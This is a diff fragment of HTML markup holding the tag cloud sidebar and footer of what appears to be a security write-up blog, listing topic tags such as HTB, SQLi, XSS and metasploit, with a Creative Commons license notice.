+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
